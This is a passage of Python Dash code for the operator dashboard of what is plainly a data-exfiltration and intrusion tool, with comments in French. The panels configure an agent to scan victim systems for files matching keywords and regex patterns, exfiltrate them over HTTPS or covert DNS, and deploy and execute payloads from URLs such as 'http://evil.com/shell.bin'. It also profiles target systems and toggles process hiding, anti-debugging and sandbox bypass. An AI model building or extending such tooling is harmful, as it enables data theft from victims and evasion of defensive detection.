            dcc.Tab(label=':: PAYLOADS & PERSISTENCE ::', value='tab-payloads', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: STEALTH & EVASION ::', value='tab-stealth', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
            dcc.Tab(label=':: LOGS & STATUS ::', value='tab-logs-status', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE), # Correction ici

        ],
        style={**CYBER_TABS_CONTAINER_STYLE}
    ),

    html.Div(id='tabs-content', style={'flexGrow': '1'}),

    # --- Éléments cachés pour persister l'état (TOUS SONT dcc.Input ou html.Pre) ---
    html.Div(id='hidden-elements', style={'display': 'none'}, children=[
        dcc.Store(id='log-streamer-init-trigger', data=0),

        dcc.Interval(
            id='interval-explorer-logs',
            interval=1 * 1000,
            n_intervals=0
        ),
        dcc.Interval(
            id='interval-dashboard-refresh',
            interval=2 * 1000,
            n_intervals=0
        ),

        html.Pre(id='_hidden_explorer_logs_buffer', style={'display': 'none'}), # Cache pour les logs de l'explorateur
        html.Pre(id='_hidden_dashboard_live_logs_buffer', style={'display': 'none'}),
        html.Pre(id='live-log-stream-display-buffer', style={'display': 'none'}), # <-- Ce composant va stocker les logs généraux et sera mis à jour par l'intervalle

        dcc.Input(id='target-url-hidden', type='text', value=DEFAULT_TARGET_URL),
        dcc.Input(id='scan-path-hidden', type='text', value=DEFAULT_SCAN_PATH),
        dcc.Input(id='aes-key-hidden', type='text', value=DEFAULT_AES_KEY),
        dcc.Input(id='exfil-method-hidden', type='text', value=DEFAULT_EXFIL_METHOD),
        dcc.Input(id='dns-server-hidden', type='text', value=DEFAULT_DNS_SERVER),
        dcc.Input(id='dns-domain-hidden', type='text', value=DEFAULT_DNS_DOMAIN),
        dcc.Input(id='file-types-hidden', type='text', value=DEFAULT_FILE_TYPES),
        dcc.Input(id='exclude-types-hidden', type='text', value=DEFAULT_EXCLUDE_TYPES),
        dcc.Input(id='min-size-hidden', type='text', value=DEFAULT_MIN_SIZE),
        dcc.Input(id='max-size-hidden', type='text', value=DEFAULT_MAX_SIZE),
        dcc.Input(id='keywords-hidden', type='text', value=DEFAULT_KEYWORDS),
        dcc.Input(id='regex-patterns-hidden', type='text', value=DEFAULT_REGEX_PATTERNS),
        dcc.Input(id='payload-url-hidden', type='text', value=DEFAULT_PAYLOAD_URL),
        dcc.Input(id='payload-path-hidden', type='text', value=DEFAULT_PAYLOAD_PATH),
        dcc.Input(id='threads-hidden', type='number', value=DEFAULT_THREADS),
        dcc.Input(id='debug-mode-hidden', type='text', value=DEFAULT_DEBUG_MODE),
        dcc.Input(id='no-clean-hidden', type='text', value=DEFAULT_NO_CLEAN),
        dcc.Input(id='no-anti-evasion-hidden', type='text', value=DEFAULT_NO_ANTI_EVASION),
        dcc.Input(id='explorer-target-host-hidden', type='text', value=DEFAULT_EXPLORER_TARGET_HOST),
        dcc.Input(id='explorer-base-path-hidden', type='text', value=DEFAULT_EXPLORER_BASE_PATH),
        dcc.Input(id='explorer-max-depth-hidden', type='number', value=DEFAULT_EXPLORER_DEPTH),

        # ID du dcc.Store corrigé ici pour correspondre aux clés utilisées dans refresh_all_live_logs
        dcc.Store(id='explorer-log-last-index', data={'file_explorer': 0, 'dashboard_stream': 0}),

        dcc.Store(id='agent-stats-store', data={
            'files_scanned': 0,
            'files_matched': 0,
            'data_exfiltrated_bytes': 0,
            'exfil_success_count': 0,
            'exfil_failed_count': 0,
            'agent_status': 'INACTIVE',
            'agent_last_activity': 'N/A',
            'agent_start_time': 'N/A'
        }),
        dcc.Input(id='stealth-hide-process-hidden', type='text', value=DEFAULT_STEALTH_HIDE_PROCESS),
        dcc.Input(id='stealth-anti-debug-hidden', type='text', value=DEFAULT_STEALTH_ANTI_DEBUG),
        dcc.Input(id='stealth-sandbox-bypass-hidden', type='text', value=DEFAULT_STEALTH_SANDBOX_BYPASS),
    ]),
])


# Callback pour rendre le contenu des onglets
@app.callback(
    [Output('tabs-content', 'children'),
     Output('payload-url-hidden', 'value', allow_duplicate=True),
     Output('payload-path-hidden', 'value', allow_duplicate=True)],
    Input('cyber-tabs', 'value'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'),
    State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    State('explorer-target-host-hidden', 'value'), State('explorer-base-path-hidden', 'value'), State('explorer-max-depth-hidden', 'value'),
    State('agent-stats-store', 'data'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    # On ne lit plus les *contenus* des buffers ici pour les passer en `children` des éléments visibles.
    # On lit uniquement l'onglet actif et les states non liées aux logs visibles
    # State('_hidden_explorer_logs_buffer', 'children'), # RETIRE
    # State('live-log-stream-display-buffer', 'children') # RETIRE
)
def render_tab_content(tab,
                       target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain, file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                       payload_url, payload_path,
                       threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                       explorer_target_host, explorer_base_path, explorer_max_depth, agent_stats_data,
                       stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
                       # explorer_logs_buffer_content, dashboard_live_logs_buffer_content): # RETIRE

    # Les valeurs des checklists doivent être converties en listes pour la création de create_checklist_section
    debug_mode_val = debug_mode_val_str.split(',') if debug_mode_val_str else []
    no_clean_val = no_clean_val_str.split(',') if no_clean_val_str else []
    no_anti_evasion_val = no_anti_evasion_val_str.split(',') if no_anti_evasion_val_str else []
    stealth_hide_process_val = stealth_hide_process_val_str.split(',') if stealth_hide_process_val_str else []
    stealth_anti_debug_val = stealth_anti_debug_val_str.split(',') if stealth_anti_debug_val_str else []
    stealth_sandbox_bypass_val = stealth_sandbox_bypass_val_str.split(',') if stealth_sandbox_bypass_val_str else []


    # Options pour les Checklists et Dropdown
    debug_checklist_options = [{'label': ' ENABLE DEBUG MODE (Verbose logs, no cleanup)', 'value': 'debug'}]
    no_clean_checklist_options = [{'label': ' DISABLE TRACE CLEANUP', 'value': 'no-clean'}]
    no_anti_evasion_checklist_options = [{'label': ' DISABLE ANTI-EVASION CONTROLS (Anti-debug/sandbox)', 'value': 'no-anti-evasion'}]
    exfil_method_options = [
        {'label': 'HTTPS (Recommended)', 'value': 'https'},
        {'label': 'DNS (Covert, requires controlled DNS server)', 'value': 'dns'}
    ]
    stealth_hide_process_options = [{'label': ' Hide Agent Process', 'value': 'hide_process'}]
    stealth_anti_debug_options = [{'label': ' Prevent Debugging', 'value': 'anti_debug'}]
    stealth_sandbox_bypass_options = [{'label': ' Bypass Common Sandbox Triggers', 'value': 'sandbox_bypass'}]


    def create_input_section(label_text, input_id, value, placeholder=None, type='text', min=None, max=None, required=False, options=None):
        return html.Div([
            html.Label(label_text, style={'color': '#00FFFF', 'marginBottom': '8px', 'display': 'block', 'fontSize': '0.95rem'}),
            html.Div([
                dcc.Input(
                    id=input_id,
                    type=type,
                    value=value,
                    placeholder=placeholder,
                    style=CYBER_INPUT_STYLE,
                    required=required,
                    min=min,
                    max=max,
                ) if options is None else dcc.Dropdown(
                    id=input_id,
                    options=options,
                    value=value,
                    style={**CYBER_INPUT_STYLE, 'color': '#7FFF00', 'padding': '0', 'minHeight': '45px', 'display': 'flex', 'alignItems': 'center'},
                    clearable=False,
                    optionHeight=40,
                    className="cyber-dropdown",
                ),
                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0,
                            style=CYBER_BUTTON_APPLY),
                # Output factice dynamique pour les messages de confirmation/débogage
                html.Div(id={'type': 'dummy-output', 'input_id': input_id}, style={'display': 'none'})
            ], style=CYBER_INPUT_WRAPPER_STYLE)
        ])

    def create_checklist_section(label_text, input_id, value, options):
        return html.Div([
            html.Label(label_text, style={'color': '#00FFFF', 'marginBottom': '8px', 'display': 'block', 'fontSize': '0.95rem'}),
            html.Div([
                dcc.Checklist(
                    id=input_id,
                    options=options,
                    value=value,
                    style={'color': '#7FFF00', 'flexGrow': '1', 'paddingTop': '10px'},
                    labelStyle={'display': 'flex', 'alignItems': 'center', 'marginBottom': '10px'}
                ),
                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0, style=CYBER_BUTTON_APPLY),
                # Output factice dynamique pour les messages de confirmation/débogage
                html.Div(id={'type': 'dummy-output', 'input_id': input_id}, style={'display': 'none'})
            ], style={**CYBER_INPUT_WRAPPER_STYLE, 'alignItems': 'flex-start', 'marginBottom': '0px'})
        ], style={'marginBottom': '20px'})


    if tab == 'tab-dashboard':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.Div([
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('files_scanned', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-files-scanned'),
                    html.Div("FILES SCANNED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('files_matched', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-files-matched'),
                    html.Div("FILES MATCHED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{round(agent_stats_data.get('data_exfiltrated_bytes', 0) / (1024*1024), 2) if agent_stats_data.get('data_exfiltrated_bytes', 0) > 0 else '0.00'} MB", style=CYBER_STAT_VALUE_STYLE, id='stat-data-exfiltrated'),
                    html.Div("DATA EXFILTRATED", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                    html.Div(f"{agent_stats_data.get('exfil_success_count', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-exfil-success'),
                    html.Div("EXFIL SUCCESS", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                    html.Div(agent_stats_data.get('agent_status', 'INACTIVE'), style={**CYBER_STAT_VALUE_STYLE, 'color': '#FFD700' if agent_stats_data.get('agent_status') == 'RUNNING' else '#FF5555'}, id='stat-agent-status'),
                    html.Div("AGENT STATUS", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                    html.Div(agent_stats_data.get('agent_start_time', 'N/A'), style=CYBER_STAT_VALUE_STYLE, id='stat-agent-start-time'),
                    html.Div("AGENT START TIME", style=CYBER_STAT_LABEL_STYLE)
                ]),
                html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                    html.Div(agent_stats_data.get('agent_last_activity', 'N/A'), style=CYBER_STAT_VALUE_STYLE, id='stat-agent-last-activity'),
                    html.Div("LAST ACTIVITY", style=CYBER_STAT_LABEL_STYLE)
                ]),
            ], style={'display': 'flex', 'flexWrap': 'wrap', 'justifyContent': 'center', 'gap': '20px', 'marginBottom': '40px'}),

            html.H2(":: LIVE SYSTEM ACTIVITY (AGENT LOGS) ::", style=CYBER_SECTION_HEADER_STYLE),
            # children=None pour laisser refresh_all_live_logs le remplir (via le nouveau callback de MAJ d'UI)
            html.Pre(None, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '200px', 'maxHeight': '400px'}, id='dashboard-live-logs_display'),
        ]), payload_url, payload_path
    elif tab == 'tab-agent-control':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: AGENT DEPLOYMENT & CONFIGURATION ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("TARGET URL (HTTPS/DNS) *:", 'target-url', target_url, required=True),
            create_input_section("SCAN PATH *:", 'scan-path', scan_path, required=True),
            create_input_section("AES KEY (32 bytes) *:", 'aes-key', aes_key, required=True),
            create_input_section("EXFILTRATION METHOD *:", 'exfil-method', exfil_method, options=exfil_method_options),

            html.Div(id='dns-options-div', children=[
                create_input_section("DNS SERVER (IP) *:", 'dns-server', dns_server, placeholder='Ex: 8.8.8.8 (Google DNS)'),
                create_input_section("DNS DOMAIN *:", 'dns-domain', dns_domain, placeholder='Ex: exfil.yourdomain.com'),
            ], style={'display': 'none'}),

            html.H2(":: SCAN FILTERING PARAMETERS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("FILE TYPES TO INCLUDE (Ex: .doc,.txt,.pdf):", 'file-types', file_types, placeholder='Comma-separated extensions'),
            create_input_section("FILE TYPES TO EXCLUDE (Ex: .exe,.dll):", 'exclude-types', exclude_types, placeholder='Comma-separated extensions'),
            create_input_section("MIN FILE SIZE (Ex: 5k, 1M, 1G):", 'min-size', min_size, placeholder='e.g., 1k, 10M, 5G'),
            create_input_section("MAX FILE SIZE (Ex: 10M, 1G):", 'max-size', max_size, placeholder='e.g., 100M, 1G'),
            create_input_section("KEYWORDS IN CONTENT (Ex: secret,password):", 'keywords', keywords, placeholder='Comma-separated keywords'),
            create_input_section("REGEX PATTERNS IN CONTENT (Ex: (\\d{3}-\\d{2}-\\d{4})):", 'regex-patterns', regex_patterns, placeholder='Comma-separated regex patterns'),

            html.H2(":: AGENT OPERATIONAL SETTINGS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_input_section("PAYLOAD URL (Optional for Dropper):", 'payload-url-control-tab-visible', payload_url, placeholder='Ex: http://evil.com/shell.bin'),
            create_input_section("PAYLOAD PATH (Optional on Target):", 'payload-path-control-tab-visible', payload_path, placeholder='Ex: /data/local/tmp/payload_binary'),
            create_input_section("PROCESSING THREADS (for scan & upload):", 'threads', threads, type='number', min=1),

            html.H2(":: DEBUG & EVASION OPTIONS ::", style=CYBER_SECTION_HEADER_STYLE),
            create_checklist_section('DEBUG MODE (Verbose logs, disables cleanup)', 'debug-mode', debug_mode_val, debug_checklist_options),
            create_checklist_section('DISABLE TRACE CLEANUP', 'no-clean', no_clean_val, no_clean_checklist_options),
            create_checklist_section('DISABLE ANTI-EVASION CONTROLS (Anti-debug/sandbox)', 'no-anti-evasion', no_anti_evasion_val, no_anti_evasion_checklist_options),

            html.Div([
                html.Button('SAVE ALL CONFIG', id='save-config-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                html.Button('LAUNCH AGENT', id='launch-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
                html.Button('STOP AGENT', id='stop-button', n_clicks=0, style=CYBER_BUTTON_DANGER),
            ], style={'marginTop': '40px', 'display': 'flex', 'justifyContent': 'center', 'gap': '25px'}),


        ]), payload_url, payload_path
    elif tab == 'tab-file-explorer':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: TARGET FILE EXPLORER ::", style=CYBER_SECTION_HEADER_STYLE),

            create_input_section("TARGET HOST (URL or IP) *:", 'explorer-target-host-display', explorer_target_host, required=True),
            create_input_section("BASE PATH FOR EXPLORATION (Optional, e.g., /var/www/html/wp-content/uploads/):", 'explorer-base-path-display', explorer_base_path, placeholder="Leave empty for full site crawl"),
            create_input_section("MAX EXPLORATION DEPTH (0 for base only, 1 for direct subfolders, etc.) :", 'explorer-max-depth-display', explorer_max_depth, type='number', min=0, required=True),

            html.Div([
                html.Button('LAUNCH EXPLORATION', id='launch-explorer-button', n_clicks=0, style={**CYBER_BUTTON_PRIMARY, 'boxShadow': '0 0 18px rgba(0,191,255,0.7)', 'backgroundImage': 'linear-gradient(145deg, #00BFFF, #0077AA)', 'marginTop': '0px'}),
                html.Button('STOP EXPLORATION', id='stop-explorer-button', n_clicks=0, style={**CYBER_BUTTON_DANGER, 'marginTop': '0px'}),
            ], style={'marginTop': '25px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),

            html.Div(id='explorer-status', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'minHeight': '50px', 'marginTop': '30px'}, children="INITIATE EXPLORATION TO VIEW RESULTS."),

            dash_table.DataTable(
                id='found-files-table',
                columns=[
                    {"name": "PATH", "id": "path", "presentation": "markdown"},
                    {"name": "TYPE", "id": "type"},
                    {"name": "MATCHING REGEX", "id": "sensitive_match"},
                    {"name": "CONTENT TYPE", "id": "content_type"}, # Nouvelle colonne pour le type de contenu
                    {"name": "SOURCE", "id": "source"}, # Nouvelle colonne pour la source de la détection
                    {"name": "ACTIONS", "id": "actions", "presentation": "markdown"}
                ],
                data=[],
                style_table={'overflowX': 'auto', 'marginTop': '30px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 15px rgba(0,255,65,0.1)'},
                style_cell=CYBER_TABLE_CELL_STYLE,
                style_header=CYBER_TABLE_HEADER_STYLE,
                css=[
                    {"selector": ".dash-spreadsheet-menu", "rule": "font-family: 'Roboto Mono', monospace;"},
                    {"selector": "button", "rule": "font-family: 'Roboto Mono', monospace;"},
                ],
                style_data_conditional=[
                    {
                        'if': {'column_id': 'actions'},
                        'textAlign': 'center'
                    },
                    {
                        'if': {'filter_query': '{type} = "directory"'},
                        'backgroundColor': '#1A1A1A',
                        'color': '#FF00FF',
                        'fontWeight': 'bold'
                    },
                    { # Style pour les types de contenu sensible
                        'if': {'filter_query': '{type} = "content_match"'},
                        'backgroundColor': '#2A1A1A',
                        'color': '#FFAA00',
                        'fontWeight': 'bold'
                    },
                     { # Style pour API
                        'if': {'filter_query': '{type} = "api_endpoint"'},
                        'backgroundColor': '#1A2A2A',
                        'color': '#00EEFF',
                        'fontWeight': 'bold'
                    },
                    { # Style pour Vuln
                        'if': {'filter_query': '{type} = "vulnerable_path"'},
                        'backgroundColor': '#3A1A1A',
                        'color': '#FF0000',
                        'fontWeight': 'bold'
                    },
                    { # Style pour Sitemap
                        'if': {'filter_query': '{type} = "sitemap_entry"'},
                        'backgroundColor': '#1A1A2A',
                        'color': '#CCAAFF',
                        'fontWeight': 'bold'
                    },
                    { # Style pour Form
                        'if': {'filter_query': '{type} = "form_data"'},
                        'backgroundColor': '#1A2A1A',
                        'color': '#00FF00',
                        'fontWeight': 'bold'
                    }
                ],
                page_action='none',
                sort_action='native',
                filter_action='native'
            ),

            html.Div(id='file-content-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#FFEE77', 'marginTop': '30px'}, children="SELECTED FILE CONTENT (Hex/Text preview)..."),
            dcc.Download(id="download-file-data"),

            html.H2(":: EXPLORER LIVE LOGS ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '40px'}),
            # children=None pour laisser refresh_all_live_logs le remplir
            html.Pre(None, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '150px'}, id='explorer-logs-output_visible'),

        ]), payload_url, payload_path
    elif tab == 'tab-system-profiler':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: TARGET SYSTEM PROFILE ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Div([
                html.P("Request detailed system information from the target agent. This includes OS details, CPU, memory, disk usage, network interfaces, active users, and running processes.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                html.Button('REQUEST SYSTEM INFO', id='request-system-info-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
                html.Div(id='system-profiler-status', style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF', 'minHeight': '50px', 'marginTop': '20px'}, children="Click 'REQUEST SYSTEM INFO' to fetch data from the agent."),
            ]),

            html.Div(id='system-info-display-area', style={'marginTop': '30px'}, children=[
                html.Details(open=True, children=[
                    html.Summary(html.H3("Operating System", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='os-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="OS information will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("CPU Information", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='cpu-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="CPU information will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Memory Usage", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='memory-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="Memory usage will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Disk Partitions", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    dash_table.DataTable(
                        id='disk-info-table',
                        columns=[
                            {"name": "Filesystem", "id": "filesystem"},
                            {"name": "Type", "id": "type"},
                            {"name": "Size", "id": "size"},
                            {"name": "Used", "id": "used"},
                            {"name": "Available", "id": "available"},
                            {"name": "Used (%)", "id": "percent_used"},
                            {"name": "Mountpoint", "id": "mountpoint"},
                        ],
                        data=[],
                        style_table={'overflowX': 'auto', 'marginTop': '10px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 10px rgba(0,255,65,0.1)'},
                        style_cell=CYBER_TABLE_CELL_STYLE,
                        style_header=CYBER_TABLE_HEADER_STYLE,
                        sort_action='native',
                        filter_action='native',
                        page_action='none',
                    ),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Network Interfaces", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    html.Div(id='network-info-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '10px'}, children="Network information will appear here."),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Logged-in Users", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    dash_table.DataTable(
                        id='users-info-table',
                        columns=[
                            {"name": "Name", "id": "name"},
                            {"name": "Terminal", "id": "terminal"},
                            {"name": "Host", "id": "host"},
                            {"name": "Started", "id": "started"},
                        ],
                        data=[],
                        style_table={'overflowX': 'auto', 'marginTop': '10px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 10px rgba(0,255,65,0.1)'},
                        style_cell=CYBER_TABLE_CELL_STYLE,
                        style_header=CYBER_TABLE_HEADER_STYLE,
                        sort_action='native',
                        filter_action='native',
                        page_action='none',
                    ),
                ]),
                html.Details(children=[
                    html.Summary(html.H3("Running Processes", style={'color': '#FF00FF', 'display': 'inline-block', 'margin': '0', 'textShadow': '0 0 5px rgba(255,0,255,0.5)'})),
                    dash_table.DataTable(
                        id='processes-info-table',
                        columns=[
                            {"name": "PID", "id": "pid"},
                            {"name": "PPID", "id": "ppid"},
                            {"name": "User", "id": "user"},
                            {"name": "Elapsed Time", "id": "elapsed_time"},
                            {"name": "CPU (%)", "id": "cpu_percent"},
                            {"name": "Memory (%)", "id": "memory_percent"},
                            {"name": "Command Line", "id": "cmdline"},
                        ],
                        data=[],
                        style_table={'overflowX': 'auto', 'marginTop': '10px', 'border': '1px solid #00AA22', 'borderRadius': '6px', 'boxShadow': '0 0 10px rgba(0,255,65,0.1)'},
                        style_cell=CYBER_TABLE_CELL_STYLE,
                        style_header=CYBER_TABLE_HEADER_STYLE,
                        sort_action='native',
                        filter_action='native',
                        page_action='none',
                    ),
                ]),
            ])
        ]), payload_url, payload_path
    elif tab == 'tab-payloads':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: PAYLOAD DEPLOYMENT & PERSISTENCE ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Div([
                html.P("Manage the deployment, execution, and persistence of custom payloads on the target system.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                html.Div([
                    create_input_section("PAYLOAD SOURCE (URL):", 'payload-source-url-visible', payload_url, placeholder='e.g., http://your.server/malware.exe'),
                    create_input_section("TARGET PATH ON AGENT:", 'payload-target-path-visible', payload_path, placeholder='e.g., /tmp/update.bin or C:\\Windows\\Temp\\temp.exe'),
                ]),
                html.Div([
                    html.Button('DEPLOY PAYLOAD', id='deploy-payload-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                    html.Button('EXECUTE PAYLOAD', id='execute-payload-button', n_clicks=0, style=CYBER_BUTTON_PRIMARY),
                    html.Button('REMOVE PAYLOAD', id='remove-payload-button', n_clicks=0, style=CYBER_BUTTON_DANGER),
                ], style={'marginTop': '20px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),
                html.Div(id='payload-status-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '30px'}, children="Payload management status and logs will appear here."),
            ]),
        ]), payload_url, payload_path
    elif tab == 'tab-stealth':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: STEALTH & ANTI-EVASION CONTROLS ::", style=CYBER_SECTION_HEADER_STYLE),
            html.Div([
                html.P("Configure and monitor the agent's stealth capabilities and anti-evasion mechanisms.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                html.Div([
                    create_checklist_section('ACTIVATE PROCESS HIDING', 'stealth-hide-process', stealth_hide_process_val, stealth_hide_process_options),
                    create_checklist_section('ENABLE ANTI-DEBUGGING', 'stealth-anti-debug', stealth_anti_debug_val, stealth_anti_debug_options),
                    create_checklist_section('BYPASS SANDBOX DETECTION', 'stealth-sandbox-bypass', stealth_sandbox_bypass_val, stealth_sandbox_bypass_options),
                ], style={'marginBottom': '30px'}),
                html.Button('APPLY STEALTH SETTINGS', id='apply-stealth-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                html.Div(id='stealth-status-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '30px'}, children="Stealth control status and evasion attempts will be logged here."),
            ]),
        ]), payload_url, payload_path
    elif tab == 'tab-logs-status':
        return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
            html.H2(":: AGENT LIVE LOG STREAM ::", style=CYBER_SECTION_HEADER_STYLE),
            # children=None pour laisser refresh_all_live_logs le remplir
            html.Pre(None, style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF'}, id='live-log-stream-display'),

            html.H2(":: ENCRYPTED LOG ARCHIVE ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '40px'}),
            html.Div([
                html.Button('REFRESH ENCRYPTED LOGS', id='refresh-logs-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                html.Button('DOWNLOAD RAW LOGS', id='download-logs-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
            ], style={'marginTop': '20px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),
            dcc.Download(id="download-logs-data"),
            html.Pre(id='decrypted-logs-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#7FFF00', 'marginTop': '30px'}, children="DECRYPTED LOGS (IF AVAILABLE)..."),
        ]), payload_url, payload_path
    elif tab == 'tab-dynamic-display':
        display_html_content = get_display_html_content()
        body_content_match = re.search(r'<body>(.*?)</body>', display_html_content, re.DOTALL)
        if body_content_match:
            return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
                html.H2(":: DYNAMIC INFORMATION DISPLAY ::", style=CYBER_SECTION_HEADER_STYLE),
                html.Iframe(
                    src="/assets/index.html",
                    style={
                        "width": "100%",
                        "height": "600px",
                        "border": "none",
                        "backgroundColor": "#0A0A0A",
                        "borderRadius": "8px",
                        "boxShadow": "inset 0 0 10px rgba(0,255,65,0.05)",
                    }
                )
            ]), payload_url, payload_path
    return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[html.H2("LOADING...", style=CYBER_SECTION_HEADER_STYLE)]), dash.no_update, dash.no_update

# --- Callbacks ---

@app.callback(Output('dns-options-div', 'style'), Input('exfil-method', 'value'))
def toggle_dns_options(method):
    return {'display': 'block'} if method == 'dns' else {'display': 'none'}


# --- CALLBACKS DE SYNCHRONISATION : Input Visible --> Hidden Input ---
# Ces callbacks sont nécessaires pour synchroniser les valeurs des inputs visibles
# (qui sont dans des onglets non persistants) vers des inputs cachés (qui sont toujours dans le DOM).
# Cela permet aux callbacks de lecture (comme apply_and_save_single_setting si on utilisait les hidden inputs)
# d'accéder à la dernière valeur mise à jour, même si l'onglet est changé.

@app.callback(Output('target-url-hidden', 'value', allow_duplicate=True), Input('target-url', 'value'), prevent_initial_call=True)
def _update_hidden_target_url(value): return value if value is not None else ''

@app.callback(Output('scan-path-hidden', 'value', allow_duplicate=True), Input('scan-path', 'value'), prevent_initial_call=True)
def _update_hidden_scan_path(value): return value if value is not None else ''

@app.callback(Output('aes-key-hidden', 'value', allow_duplicate=True), Input('aes-key', 'value'), prevent_initial_call=True)
def _update_hidden_aes_key(value): return value if value is not None else ''

@app.callback(Output('exfil-method-hidden', 'value', allow_duplicate=True), Input('exfil-method', 'value'), prevent_initial_call=True)
def _update_hidden_exfil_method(value): return value if value is not None else ''

@app.callback(Output('dns-server-hidden', 'value', allow_duplicate=True), Input('dns-server', 'value'), prevent_initial_call=True)
def _update_hidden_dns_server(value): return value if value is not None else ''

